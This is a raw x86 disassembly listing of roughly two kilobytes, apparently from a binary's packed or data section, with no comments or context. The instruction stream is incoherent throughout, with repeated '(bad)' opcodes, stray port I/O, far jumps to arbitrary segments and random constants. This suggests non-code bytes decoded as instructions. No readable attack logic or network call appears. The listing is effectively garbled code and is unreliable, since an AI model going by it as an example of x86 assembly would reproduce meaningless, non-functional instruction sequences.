  4095cf:	sti    
  4095d0:	add    eax,0xbcb700cf
  4095d5:	mov    eax,ds:0xec663a07
  4095da:	cmp    esp,esi
  4095dc:	inc    eax
  4095dd:	retf   
  4095de:	lea    ebx,[ebx+edx*1+0x6]
  4095e2:	mov    cl,0x46
  4095e4:	or     eax,0xc4638c3f
  4095e9:	jp     0x40957c
  4095eb:	mov    bh,0x4
  4095ed:	std    
  4095ee:	pop    ecx
  4095ef:	mov    edx,0x5017acc
  4095f4:	rol    esp,0x8d
  4095f7:	jle    0x40966b
  4095f9:	dec    eax
  4095fa:	cli    
  4095fb:	lods   al,BYTE PTR ds:[esi]
  4095fc:	mov    ecx,0xb5bf137a
  409601:	push   0xe941fc57
  409606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409607:	leave  
  409608:	fld    TBYTE PTR [edi]
  40960a:	fsubr  DWORD PTR [ebp-0x4ef3ffda]
  409610:	xlat   BYTE PTR ds:[ebx]
  409611:	pop    esi
  409612:	sbb    ah,BYTE PTR [edi-0x5f]
  409615:	xor    al,0x98
  409617:	and    al,0xb8
  409619:	imul   edi,DWORD PTR ds:0x63657c4d,0x8be2d1f8
  409623:	xor    DWORD PTR [esi+0x3c3d47df],eax
  409629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40962a:	mov    al,0x84
  40962c:	imul   ebx,DWORD PTR [ebx-0x4],0x2e
  409630:	in     al,dx
  409631:	(bad)  
  409632:	out    0x39,al
  409634:	sbb    al,0xb5
  409637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409638:	jl     0x4095f6
  40963a:	or     eax,0xf4bb76
  40963f:	pop    es
  409640:	push   ss
  409641:	arpl   bx,si
  409643:	repnz mov ebp,0x7d52b709
  409649:	stc    
  40964a:	jecxz  0x4096b0
  40964c:	loop   0x4096af
  40964e:	add    al,BYTE PTR [edx]
  409650:	data16 out dx,al
  409652:	in     al,0xe7
  409654:	(bad)  
  409655:	push   esi
  409656:	jl     0x409630
  409658:	xchg   edi,eax
  409659:	mov    ds:0xaae118de,al
  40965e:	fild   QWORD PTR [ebp+0x4f]
  409661:	mov    bl,0x77
  409664:	xor    bh,BYTE PTR [edi+0x625c4cf2]
  40966a:	js     0x4096e0
  40966c:	push   edx
  40966d:	shl    DWORD PTR [ebx+ecx*2-0x59fbbec8],0x6c
  409675:	xor    dh,BYTE PTR fs:[edi]
  409678:	mov    ecx,DWORD PTR [eax+0x1e]
  40967b:	out    0xc6,eax
  40967d:	sbb    DWORD PTR [esi+edx*2],ecx
  409680:	and    eax,0xca7986a
  409685:	xchg   esp,eax
  409686:	push   edi
  409687:	xchg   ecx,eax
  409688:	ins    BYTE PTR es:[edi],dx
  409689:	test   eax,0xcbc84b04
  40968e:	mov    ?,WORD PTR [ebp+0x3d]
  409691:	jb     0x4096fe
  409693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409694:	pop    ecx
  409695:	dec    edx
  409696:	add    al,0x18
  409698:	jb     0x409630
  40969a:	jb     0x409683
  40969c:	(bad)  
  40969d:	push   ss
  40969e:	and    BYTE PTR [ebp-0x72180965],cl
  4096a4:	dec    ecx
  4096a5:	js     0x409664
  4096a7:	imul   ecx,DWORD PTR [edx+ecx*1-0x6ac02bbc],0x39bfe7b6
  4096b2:	out    0x37,al
  4096b4:	sub    dl,al
  4096b6:	shl    BYTE PTR [esi],0x5c
  4096b9:	or     ah,BYTE PTR [ebx-0x3d81812d]
  4096bf:	dec    esi
  4096c0:	repnz lock lock fistp DWORD PTR [ecx-0x56]
  4096c6:	lahf   
  4096c7:	xor    DWORD PTR [ebx],ebx
  4096c9:	cmp    DWORD PTR [edi],0x96f4af7
  4096cf:	adc    al,0xe7
  4096d1:	popf   
  4096d2:	imul   DWORD PTR [ebx]
  4096d4:	dec    ebp
  4096d5:	mov    esp,DWORD PTR [ebx+0x4c]
  4096d8:	push   ecx
  4096d9:	in     al,0xf0
  4096db:	retf   
  4096dc:	sbb    eax,0x1a1faf2b
  4096e1:	scas   eax,DWORD PTR es:[edi]
  4096e2:	mov    ah,0xea
  4096e4:	push   eax
  4096e5:	add    dh,cl
  4096e7:	fdivrp st(1),st
  4096e9:	(bad)  
  4096ea:	out    dx,al
  4096eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ec:	repnz loope 0x409755
  4096ef:	pop    ebx
  4096f0:	je     0x409729
  4096f2:	xor    dl,BYTE PTR [esi-0x80]
  4096f5:	and    ah,BYTE PTR gs:[esi+0x77]
  4096f9:	pusha  
  4096fa:	push   ecx
  4096fb:	inc    edx
  4096fc:	iret   
  4096fd:	push   0xde3bb89c
  409702:	xor    eax,0x6cdebff1
  409707:	or     DWORD PTR [eax+0x51],ecx
  40970a:	jb     0x4096f0
  40970c:	inc    edi
  40970d:	lods   al,BYTE PTR ds:[esi]
  40970e:	inc    esp
  40970f:	adc    al,0x51
  409711:	pop    edx
  409712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409713:	xor    DWORD PTR [esi+0x75],ecx
  409716:	iret   
  409717:	xor    bh,ah
  409719:	inc    eax
  40971a:	dec    ecx
  40971b:	pusha  
  40971c:	sbb    BYTE PTR [edx+esi*8-0x36fb9341],dh
  409723:	popf   
  409724:	dec    ecx
  409725:	pop    ss
  409726:	sahf   
  409727:	xchg   BYTE PTR [eax-0x3bd8a231],ch
  40972d:	cli    
  40972e:	pop    edx
  40972f:	inc    ecx
  409730:	shl    BYTE PTR [edx+0x7d72f901],cl
  409736:	xor    eax,0xc9cd961d
  40973b:	addr16 cmc 
  40973d:	in     al,0xc
  40973f:	push   0x95242010
  409744:	call   0x4d426600
  409749:	xor    BYTE PTR [ebx+0x50796981],al
  40974f:	into   
  409750:	push   eax
  409751:	repz icebp 
  409753:	cmp    eax,DWORD PTR [ecx-0x193d5bbc]
  409759:	mov    esi,0xbb6e085f
  40975e:	sti    
  40975f:	sbb    BYTE PTR [eax+ecx*2],0x65
  409763:	in     al,dx
  409764:	arpl   WORD PTR [edi-0x6a],di
  409767:	loope  0x40977e
  409769:	pusha  
  40976a:	call   0x11e1:0xf66547e1
  409771:	dec    esi
  409772:	lods   al,BYTE PTR ds:[esi]
  409773:	dec    ebx
  409774:	or     eax,0x3fa5fc9a
  409779:	int3   
  40977a:	cs mov edx,0xcc6fcd9b
  409780:	shl    BYTE PTR [edi-0x6b5d91c],1
  409786:	mov    DWORD PTR [ebp-0x4],eax
  409789:	cmp    DWORD PTR [ebp-0x4],0x0
  40978d:	lea    eax,[ebp+0x4]
  409790:	jmp    0x409c9b
  409795:	rcl    dh,1
  409797:	ror    ecx,cl
  409799:	ror    ecx,1
  40979b:	(bad)  
  40979c:	(bad)  
  40979e:	(bad)
  4097a2:	or     BYTE PTR [esi+0x15],dl
  4097a5:	and    al,0xf8
  4097a7:	js     0x409821
  4097a9:	push   0x7c
  4097ab:	js     0x409825
  4097ad:	div    DWORD PTR [ebx+edx*1+0x4b54e15f]
  4097b4:	ja     0x409787
  4097b6:	pop    ss
  4097b7:	mov    esp,0xcfb75be3
  4097bc:	jns    0x409773
  4097be:	data16 (bad) 
  4097c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097c1:	int3   
  4097c2:	mov    ecx,ecx
  4097c4:	jne    0x40983d
  4097c6:	(bad)  
  4097c8:	adc    BYTE PTR [ebx-0x27b0a4e7],0x87
  4097cf:	call   0xd34c:0xe21c179b
  4097d6:	inc    edx
  4097d7:	pop    ds
  4097d8:	fisub  WORD PTR [ebx+0x72566bc8]
  4097de:	jp     0x4097ef
  4097e0:	inc    ebp
  4097e1:	cs std 
  4097e3:	push   ecx
  4097e4:	cmp    eax,0x85e6ad07
  4097e9:	inc    ecx
  4097ea:	push   ss
  4097eb:	mov    bh,0x8d
  4097ed:	push   edx
  4097ee:	rcr    DWORD PTR [edx+0x55],0xf
  4097f2:	add    edi,edx
  4097f4:	and    al,0xaf
  4097f6:	in     al,0x93
  4097f8:	daa    
  4097f9:	into   
  4097fa:	and    DWORD PTR ds:0xbdbd3e56,ebp
  409800:	cdq    
  409801:	mov    esi,0xfc8cb701
  409806:	or     ebx,DWORD PTR [esi+0x7a93fc94]
  40980c:	mov    ds,WORD PTR [edi+0x58cef8cc]
  409812:	jmp    0x4b08:0xb7203477
  409819:	inc    esi
  40981a:	test   eax,0x74e558ad
  40981f:	inc    eax
  409820:	ja     0x409802
  409822:	jae    0x409820
  409824:	(bad)  
  409825:	sahf   
  409826:	xor    BYTE PTR [esi+0x4b],al
  409829:	cdq    
  40982a:	xchg   edx,eax
  40982b:	pop    esp
  40982c:	jecxz  0x409818
  40982e:	lds    edi,FWORD PTR [edx-0x1]
  409831:	jb     0x409834
  409833:	mov    bh,0xb7
  409835:	push   0xffffff8e
  409837:	xchg   ebp,eax
  409838:	dec    esp
  409839:	(bad)
  40983c:	rol    DWORD PTR [eax-0x99019c0],0x82
  409843:	xchg   ecx,eax
  409844:	push   ss
  409845:	ds adc al,0x3d
  409848:	cmp    ah,dh
  40984a:	cmp    al,0xaa
  40984c:	mov    WORD PTR [eax+0x2e406816],ds
  409852:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409854:	or     esp,eax
  409856:	jge    0x409869
  409858:	(bad)  
  40985a:	dec    ebx
  40985b:	dec    ecx
  40985c:	add    eax,0x9bed588b
  409861:	dec    ecx
  409862:	mov    eax,0xf9e06b2c
  409867:	or     BYTE PTR [ebx+0x6721ea18],dl
  40986d:	data16 stc 
  40986f:	cmp    DWORD PTR [eax],edi
  409871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409872:	push   ss
  409873:	pop    ebx
  409874:	add    DWORD PTR [eax+0x48],ecx
  409877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409878:	cmc    
  409879:	call   0xc62bf49d
  40987e:	xchg   esp,eax
  40987f:	mov    WORD PTR [edi+0x49763a39],gs
  409885:	gs xor ecx,esi
  409888:	gs push ebp
  40988a:	call   0x3375:0xc9d70c48
  409891:	js     0x409906
  409893:	sub    DWORD PTR [eax-0x51],0x9b8c9e1f
  40989a:	jmp    0xe38f:0xe2053072
  4098a1:	imul   edi,DWORD PTR [ecx+0x6e],0x49
  4098a5:	jns    0x40990c
  4098a7:	sbb    bh,BYTE PTR [esi-0xb]
  4098aa:	pop    edx
  4098ab:	pop    edi
  4098ac:	jl     0x409903
  4098ae:	cmp    eax,DWORD PTR [ecx]
  4098b0:	aam    0x56
  4098b2:	inc    edx
  4098b3:	adc    edx,DWORD PTR [ebx-0x7fef248c]
  4098b9:	mov    cl,0xc4
  4098bb:	push   edx
  4098bc:	sbb    eax,0x3422a7fd
  4098c1:	push   eax
  4098c2:	xchg   esp,eax
  4098c3:	(bad)  
  4098c5:	xchg   esi,eax
  4098c6:	les    ebx,FWORD PTR [ebx-0x35abc34]
  4098cc:	adc    al,0x34
  4098ce:	inc    ecx
  4098cf:	jae    0x409899
  4098d1:	into   
  4098d2:	xchg   edi,eax
  4098d3:	fisub  WORD PTR [esi]
  4098d5:	jmp    0x409907
  4098d7:	das    
  4098d8:	push   esp
  4098d9:	and    BYTE PTR [edx-0x1881f53c],0xce
  4098e0:	mov    gs,WORD PTR [esi]
  4098e2:	jecxz  0x4098f1
  4098e4:	inc    ebp
  4098e5:	and    DWORD PTR [esi+ecx*1],ebx
  4098e8:	adc    edx,eax
  4098ea:	stc    
  4098eb:	adc    al,0x43
  4098ed:	jmp    0xdb913789
  4098f2:	adc    DWORD PTR [eax-0x58],ebp
  4098f5:	daa    
  4098f6:	retf   0xb06
  4098f9:	mov    ebx,0x8deda787
  4098fe:	mov    es,WORD PTR [edx+ebx*1]
  409901:	loopne 0x4098ec
  409903:	jns    0x40993d
  409905:	adc    edx,DWORD PTR [ebp+eiz*8+0x1673e702]
  40990c:	mov    cs,WORD PTR [eax+esi*4-0x13]
  409910:	sub    ebp,ebx
  409912:	ins    BYTE PTR es:[edi],dx
  409913:	fnstsw WORD PTR [edi+0x413797a2]
  409919:	(bad)  
  40991a:	sbb    eax,0xdc7c0866
  40991f:	jb     0x4098ff
  409921:	stc    
  409922:	mov    dh,0xb4
  409924:	push   ebp
  409925:	lods   eax,DWORD PTR ds:[esi]
  409926:	fdiv   QWORD PTR [esi+0x5e]
  409929:	cmc    
  40992a:	ins    BYTE PTR es:[edi],dx
  40992b:	pushf  
  40992c:	fdivr  DWORD PTR [edi]
  40992e:	inc    edi
  40992f:	shl    DWORD PTR [ecx+0x5d1bbf14],1
  409935:	imul   esi,DWORD PTR [ecx+ebx*1-0x26],0xffffff80
  40993a:	fs cwde 
  40993c:	ja     0x409926
  40993e:	pop    ebx
  40993f:	pop    ecx
  409940:	outs   dx,BYTE PTR ds:[esi]
  409941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409942:	and    ebx,DWORD PTR [esi+0x252250f5]
  409948:	sbb    al,0x2f
  40994a:	fdivr  DWORD PTR ds:0xb229839d
  409950:	dec    ebx
  409951:	sub    al,0x16
  409953:	jecxz  0x40992f
  409955:	repnz xor DWORD PTR [ebp-0x9],0x7d
  40995a:	push   0x202b1432
  40995f:	inc    esp
  409960:	xchg   DWORD PTR [esi],esi
  409962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409963:	test   eax,0x26791b8d
  409968:	addr16 dec edi
  40996a:	fnsave [esi-0x27]
  40996d:	jbe    0x40995a
  40996f:	out    0xf7,al
  409971:	imul   esi,DWORD PTR [ecx-0x4fc855e1],0x25
  409978:	aad    0xc2
  40997a:	cld    
  40997b:	(bad)  
  40997c:	fld    QWORD PTR [ebx-0x4f]
  40997f:	in     al,dx
  409980:	iret   
  409981:	add    eax,0xceb2b83e
  409986:	js     0x40991e
  409988:	ret    
  409989:	(bad)  
  40998a:	sub    eax,0x4d7e6f6d
  40998f:	adc    BYTE PTR [esi+0x45],dl
  409992:	into   
  409993:	loop   0x4099cf
  409995:	sbb    eax,0x25faecc8
  40999a:	xchg   ebp,eax
  40999b:	pop    ecx
  40999c:	cmp    BYTE PTR [esi-0x2d],bl
  40999f:	loope  0x4099fc
  4099a1:	jae    0x40995d
  4099a3:	out    dx,eax
  4099a4:	push   ebp
  4099a5:	outs   dx,DWORD PTR ds:[esi]
  4099a6:	mov    gs,ecx
  4099a8:	pop    ds
  4099a9:	(bad)  
  4099aa:	sbb    DWORD PTR [ebx],ecx
  4099ac:	and    esp,DWORD PTR [eax]
  4099ae:	stos   DWORD PTR es:[edi],eax
  4099af:	jg     0x4099d6
  4099b1:	cmc    
  4099b2:	xor    ah,dl
  4099b4:	xchg   DWORD PTR [edi],edi
  4099b6:	mov    cl,BYTE PTR [edi-0x22]
  4099b9:	sti    
  4099ba:	mov    cl,0x45
  4099bc:	pop    ecx
  4099bd:	fld    DWORD PTR [eax-0x4d]
  4099c0:	mov    eax,0x751ad023
  4099c5:	pusha  
  4099c6:	ret    0x219e
  4099c9:	clc    
  4099ca:	test   BYTE PTR [esi-0x50107dd3],cl
  4099d0:	inc    ebx
  4099d1:	pop    ecx
  4099d2:	icebp  
  4099d3:	pop    esp
  4099d4:	xchg   ebp,eax
  4099d5:	add    bh,BYTE PTR [edi-0x4]
  4099d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d9:	jmp    0x409a37
  4099db:	dec    ecx
  4099dc:	pushf  
  4099dd:	or     DWORD PTR [ebx],0x4036ea93
  4099e3:	addr16 xchg esi,eax
  4099e5:	pusha  
  4099e6:	inc    ecx
  4099e7:	rol    BYTE PTR [edi],1
  4099e9:	imul   eax,DWORD PTR [ecx+0x28460278],0xffffffad
  4099f0:	xor    al,0x22
  4099f2:	test   al,0x3a
  4099f4:	or     al,0xec
  4099f6:	sub    DWORD PTR ds:0xeae4f296,0x9cbb5706
  409a00:	mul    BYTE PTR ds:0x5511e3af
  409a06:	imul   ebx,DWORD PTR [esi-0x5fa068cf],0x1ded4d0a
  409a10:	mov    ecx,0xe775209
  409a15:	out    0xb3,al
  409a17:	repz jle 0x409a8d
  409a1a:	daa    
  409a1b:	add    cl,dl
  409a1d:	mov    bh,0x84
  409a1f:	out    dx,al
  409a20:	push   ds
  409a21:	add    al,BYTE PTR [edi-0x26eaecf6]
  409a27:	aas    
  409a28:	sbb    eax,0xe6d66d0d
  409a2d:	scas   eax,DWORD PTR es:[edi]
  409a2e:	xor    eax,0x550981ee
  409a33:	fldlg2 
  409a35:	cs jecxz 0x409a35
  409a38:	fild   DWORD PTR [edx-0x627762e9]
  409a3e:	scas   eax,DWORD PTR es:[edi]
  409a3f:	add    esi,DWORD PTR [esi-0x6ced39ef]
  409a45:	sbb    BYTE PTR [ebp+0x2374ffc3],bh
  409a4b:	push   esi
  409a4c:	jp     0x409a4a
  409a4e:	add    eax,0x920211d7
  409a53:	out    0x43,al
  409a55:	out    0xc2,eax
  409a57:	shl    DWORD PTR [edi+0x3f],0xbc
  409a5b:	imul   ebx,DWORD PTR [ebx],0x4875986
  409a61:	pop    esp
  409a62:	pop    ecx
  409a63:	ret    
  409a64:	jns    0x409add
  409a66:	mov    ebx,DWORD PTR [eax-0x26]
  409a69:	out    dx,eax
  409a6a:	jge    0x409a86
  409a6c:	and    bl,ah
  409a6e:	sub    dl,0xe3
  409a71:	sbb    BYTE PTR [edx],dh
  409a73:	xor    al,BYTE PTR [ebx-0x6d]
  409a76:	dec    esp
  409a77:	imul   ecx,DWORD PTR [ecx-0x50],0x6d3dc104
  409a7e:	or     al,0x6c
  409a80:	and    dh,BYTE PTR [edx+0x78]
  409a83:	(bad)  
  409a84:	mov    dl,0x0
  409a86:	outs   dx,BYTE PTR ds:[esi]
  409a87:	add    eax,0xf60b03a0
  409a8c:	sub    ebx,DWORD PTR [ecx+0x9379e84]
  409a92:	gs rcl dl,0xf2
  409a96:	gs (bad) 
  409a98:	cs push edx
  409a9a:	aam    0xd9
  409a9c:	dec    eax
  409a9d:	xor    BYTE PTR [edx+eiz*2],cl
  409aa0:	push   ebx
  409aa1:	add    edx,ebp
  409aa3:	mov    ds:0xc62f8491,al
  409aa8:	inc    ecx
  409aa9:	cmp    edx,ebx
  409aab:	cmp    cl,dl
  409aad:	or     cl,bh
  409aaf:	(bad)  
  409ab0:	fsub   QWORD PTR ds:0x9d4f8dee
  409ab6:	loop   0x409aac
  409ab8:	nop
  409ab9:	push   esp
  409aba:	adc    eax,0xeff8133e
  409abf:	mov    edx,0xabfe8c44
  409ac4:	sbb    eax,0x4490485e
  409ac9:	cli    
  409aca:	inc    edx
  409acb:	cmp    DWORD PTR ds:0x170a681e,esp
  409ad1:	xor    ebx,esp
  409ad3:	dec    ebp
  409ad4:	sub    cl,BYTE PTR [edx+0x57]
  409ad7:	into   
  409ad8:	push   edi
  409ad9:	(bad)  
  409ada:	push   eax
  409adb:	fstp   st(6)
  409add:	jle    0x409ab4
  409adf:	shr    BYTE PTR [ecx],1
  409ae1:	sub    edx,esp
  409ae3:	or     cl,bh
  409ae5:	xchg   ebx,eax
  409ae6:	fild   WORD PTR [ecx]
  409ae8:	fisttp WORD PTR [ebx-0x51]
  409aeb:	sbb    al,0x89
  409aed:	ss int3 
  409aef:	pushf  
  409af0:	nop
  409af1:	jp     0x409b67
  409af3:	aam    0xd6
  409af5:	push   cs
  409af6:	daa    
  409af7:	jg     0x409b69
  409af9:	mov    eax,ecx
  409afb:	jnp    0x409abb
  409afd:	jecxz  0x409ad6
  409aff:	scas   al,BYTE PTR es:[edi]
  409b00:	and    BYTE PTR [ebx-0xc],ah
  409b03:	(bad)  
  409b04:	mov    ebp,ecx
  409b06:	adc    cl,BYTE PTR [edi+edi*8-0x77]
  409b0a:	in     al,0xea
  409b0c:	fucomi st,st(5)
  409b0e:	adc    ch,BYTE PTR [edx-0x3f279d93]
  409b14:	xlat   BYTE PTR ds:[ebx]
  409b15:	jmp    0x9da7:0x7a94a7
  409b1c:	mov    dh,0xae
  409b1e:	push   cs
  409b1f:	mov    ds:0xbbe5df5e,eax
  409b24:	dec    ebp
  409b25:	shr    DWORD PTR [ebp-0x605c02a6],0x75
  409b2c:	int3   
  409b2d:	dec    edi
  409b2e:	mov    edi,0x427db7a8
  409b33:	xor    edx,esi
  409b35:	stc    
  409b36:	ret    
  409b37:	xchg   esp,eax
  409b38:	(bad)  
  409b3a:	fidivr DWORD PTR ds:0xaa93182f
  409b40:	and    al,dh
  409b42:	pop    esp
  409b43:	cmp    DWORD PTR [ecx-0x2c032c18],eax
  409b49:	jns    0x409b1d
  409b4b:	fstp   TBYTE PTR [bp-0x6ae1]
  409b50:	push   es
  409b51:	test   DWORD PTR ds:0xa4055e4c,0x50ed40bb
  409b5b:	mov    esi,DWORD PTR [ebx]
  409b5d:	popf   
  409b5e:	ds into 
  409b60:	xchg   edx,eax
  409b61:	aam    0x8a
  409b63:	and    eax,edx
  409b65:	cmp    BYTE PTR ds:0x4889aeda,dh
  409b6b:	jecxz  0x409b7b
  409b6d:	xor    eax,0x240aa2d
  409b72:	or     dl,BYTE PTR [ebx]
  409b74:	rcl    ebx,1
  409b76:	dec    esi
  409b77:	leave  
  409b78:	repz sub BYTE PTR [ecx+ebp*2-0x74fa36ff],dl
  409b80:	dec    ebx
  409b81:	in     al,0xd1
  409b83:	xor    al,0x99
  409b85:	pop    eax
  409b86:	mov    dh,0xd9
  409b88:	jge    0x409b18
  409b8a:	and    dl,al
  409b8c:	(bad)  
  409b8d:	(bad)  
  409b8e:	cmc    
  409b8f:	jecxz  0x409bf3
  409b91:	ins    BYTE PTR es:[edi],dx
  409b92:	ss pusha 
  409b94:	cmp    ebp,DWORD PTR [ebx-0xfcbbc52]
  409b9a:	push   0xffffffa6
  409b9c:	jge    0x409b2b
  409b9e:	push   edx
  409b9f:	mov    edi,0xa59b5321
  409ba4:	imul   ebp,DWORD PTR [ebx+ebp*1-0x3afa8ab1],0x1c60b23e
  409baf:	pop    esi
  409bb0:	cdq    
  409bb1:	mov    al,BYTE PTR [ecx+0x6f]
  409bb4:	shl    DWORD PTR [eax+0x2a64f752],1
  409bba:	clc    
  409bbb:	sub    DWORD PTR [ebp+eax*1-0x602df172],ebx
  409bc2:	jbe    0x409ba3
  409bc4:	xchg   edi,eax
  409bc5:	inc    esi
  409bc6:	lods   eax,DWORD PTR ds:[esi]
  409bc7:	push   esp
  409bc8:	cmp    ah,bl
  409bca:	fist   WORD PTR [esi]
  409bcc:	mov    ch,0xca
  409bce:	mov    dl,0xee
  409bd0:	and    al,0xa2
  409bd2:	sti    
  409bd3:	inc    ecx
  409bd4:	push   esp
  409bd5:	(bad)  
  409bd6:	repnz pop es
  409bd8:	test   DWORD PTR [edi],edx
  409bda:	pop    edi
  409bdb:	into   
  409bdc:	imul   DWORD PTR [eax+0x41]
  409bdf:	jo     0x409ba3
  409be1:	daa    
  409be2:	xchg   ebp,eax
  409be3:	jmp    0xe9bf:0x9ae4812d
  409bea:	or     ecx,esi
  409bec:	adc    DWORD PTR [eax+0x6dbe9427],esi
  409bf2:	js     0x409b98
  409bf4:	jp     0x409bef
  409bf6:	out    0xa8,al
  409bf8:	or     eax,0xdc07885a
  409bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfe:	mov    edi,0x9e4f6ace
  409c03:	jno    0x409b9e
  409c05:	push   0x4111cd40
  409c0a:	in     al,dx
  409c0b:	ret    0xf539
  409c0e:	sub    BYTE PTR [esp+edi*8+0x8a1b946],al
  409c15:	add    al,0x2e
  409c17:	push   0xfffffff3
  409c19:	mov    ecx,0xec4bf51d
  409c1e:	lea    ebx,[edx+0x5ce12663]
  409c24:	adc    eax,0x4d54833b
  409c29:	lock enter 0x8c3,0x26
  409c2e:	xor    BYTE PTR [ebx+eax*8-0x76f0312e],al
  409c35:	ror    DWORD PTR [edi+0x682aa03f],cl
  409c3b:	test   dl,dh
  409c3d:	adc    al,0xcd
  409c3f:	gs rcr ecx,1
  409c42:	mov    edi,0x56c6bd91
  409c47:	sbb    edi,ebp
  409c49:	daa    
  409c4a:	sub    cl,BYTE PTR [ecx-0x74482208]
  409c50:	cld    
  409c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c52:	mov    ah,0x10
  409c54:	adc    ah,BYTE PTR [eax+0x72]
  409c57:	lea    edi,[ebx-0x7d091787]
  409c5d:	test   DWORD PTR [ebx],esi
  409c5f:	jmp    0x4131:0x5ca3197a
  409c66:	fild   QWORD PTR ds:0x2ce91c96
  409c6c:	call   0x1409:0x5df00833
  409c73:	mov    edi,0xc1345427
  409c78:	fistp  WORD PTR [edx+ebx*1-0x3de1e8de]
  409c7f:	sbb    cl,bl
  409c81:	or     eax,0x62d671c2
  409c86:	daa    
  409c87:	bts    DWORD PTR [edi-0x5f],ebp
  409c8b:	and    ebp,ebx
  409c8d:	loope  0x409cb6
  409c8f:	cmp    DWORD PTR [eax+0x2d],edx
  409c92:	add    bl,dl
  409c94:	(bad)  
  409c95:	jmp    DWORD PTR [ebx-0x14]
  409c98:	pusha  
  409c99:	fsubrp st(2),st
  409c9b:	mov    DWORD PTR [ebp-0x38],eax
  409c9e:	jmp    0x40a1a9
  409ca3:	ret    
  409ca4:	ror    ch,1
  409ca6:	(bad)  
  409ca7:	fld    st(5)
  409ca9:	(bad)  
  409cab:	outs   dx,BYTE PTR ds:[esi]
  409cac:	js     0x409c6d
  409cae:	inc    esi
  409caf:	or     eax,0x16893df0
  409cb4:	cmp    DWORD PTR [eax+0x78],0x6a
  409cb8:	jl     0x409d32
  409cba:	js     0x409cc0
  409cbc:	ins    DWORD PTR es:[edi],dx
  409cbd:	cdq    
  409cbe:	hlt    
  409cbf:	adc    cl,dl
  409cc1:	xchg   BYTE PTR ds:0xec88fa64,dh
  409cc7:	mov    dh,0xc7
  409cc9:	and    al,0x8d
  409ccb:	jno    0x409d3f
  409ccd:	and    DWORD PTR [esi+0x1b1ce548],eax
  409cd3:	dec    edx
  409cd4:	ret    
  409cd5:	pop    edx
  409cd6:	add    ah,0xdd
  409cd9:	pop    eax
  409cda:	mov    ch,0x9f
  409cdc:	jo     0x409d37
  409cde:	(bad)  
  409ce0:	sar    bh,0x2c
  409ce3:	test   BYTE PTR [eax],bh
  409ce5:	sub    eax,0x16a6b5f0
  409cea:	mov    al,0xe4
  409cec:	pop    esp
  409ced:	repz xor al,0xa2
  409cf0:	adc    al,0x24
  409cf2:	xor    eax,DWORD PTR ds:0x2da137a6
  409cf8:	outs   dx,BYTE PTR ds:[esi]
  409cf9:	(bad)  [esi-0x5dffaa01]
  409cff:	je     0x409c8c
  409d01:	addr16 repz daa 
  409d04:	sbb    dl,dh
  409d06:	clc    
  409d07:	shr    DWORD PTR [edx+0x0],1
  409d0a:	jo     0x409d33
  409d0c:	push   ebp
  409d0d:	pop    ebp
  409d0e:	push   edx
  409d0f:	or     al,0x20
  409d11:	(bad)  
  409d12:	adc    dh,BYTE PTR [ebx+0x19c29c76]
  409d18:	int3   
  409d19:	mov    ebp,0x31f9cbd6
  409d1e:	retf   
  409d1f:	xor    dh,bh
  409d21:	mov    ebp,0xfb5782bf
  409d26:	fsubr  DWORD PTR [ebp+0x6be853ab]
  409d2c:	retf   
  409d2d:	imul   eax,DWORD PTR [esp+ebp*2+0xbf1c5fd],0xbead7cb4
  409d38:	pop    ecx
  409d39:	outs   dx,DWORD PTR ds:[esi]
  409d3a:	pop    eax
  409d3b:	mov    DWORD PTR [ebp+0x12],0x1c7da0fe
  409d42:	xor    DWORD PTR [esi-0xd9935b],esi
  409d48:	idiv   DWORD PTR [esi]
  409d4a:	data16 imul BYTE PTR [eax]
  409d4d:	push   cs
  409d4e:	push   ebp
  409d4f:	sti    
  409d50:	mov    eax,ds
  409d52:	fisttp WORD PTR [edx+0x2]
  409d55:	call   0x2226:0x5d963db
  409d5c:	jg     0x409d3f
  409d5e:	(bad)  
  409d60:	adc    ch,BYTE PTR [ecx]
  409d62:	dec    edi
  409d63:	xchg   DWORD PTR [edx+0x627a21b2],esp
  409d69:	xchg   DWORD PTR [ebx+0x87d426e],ebx
  409d6f:	lock xor ebx,DWORD PTR ds:0x732c839b
  409d76:	lods   eax,DWORD PTR ss:[si]
  409d79:	or     bl,BYTE PTR ds:0xe786df3a
  409d7f:	cmp    esi,DWORD PTR [ecx-0x29]
  409d82:	adc    eax,0x21493ef2
  409d87:	jmp    0x708737a
  409d8c:	jecxz  0x409d95
  409d8e:	cmp    al,0xd9
  409d90:	xchg   edx,eax
  409d91:	jp     0x409d75
  409d93:	(bad)  
  409d95:	(bad)  
  409d96:	nop
  409d97:	bound  esp,QWORD PTR [ebp+eiz*1-0x45]
  409d9b:	mov    ah,0x95
  409d9d:	or     al,0x92
  409d9f:	push   ebp
  409da0:	push   0xffffffaa
  409da2:	add    ebp,0x48
  409da5:	imul   edx,DWORD PTR [ebx],0xffffffb3
  409da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da9:	push   eax
  409daa:	shl    al,0x65
  409dad:	loop   0x409dff
  409daf:	popa   
  409db0:	mov    esi,0x75155a64
  409db5:	dec    ebp
  409db6:	and    eax,DWORD PTR [esp+ebp*1]
  409db9:	rcr    BYTE PTR [ebp+0x650cb465],1
  409dbf:	dec    esi
  409dc0:	sbb    al,0x2b
  409dc2:	imul   BYTE PTR [edi+edx*8]
  409dc5:	adc    edi,ebx
  409dc7:	ficomp WORD PTR [esp+edx*8-0x6248d300]
  409dce:	ffreep st(3)
  409dd0:	stos   DWORD PTR es:[edi],eax
  409dd1:	scas   al,BYTE PTR es:[edi]
  409dd2:	sbb    al,0x2c
  409dd4:	or     esp,DWORD PTR [edx]
  409dd6:	ret    
  409dd7:	in     eax,0x97
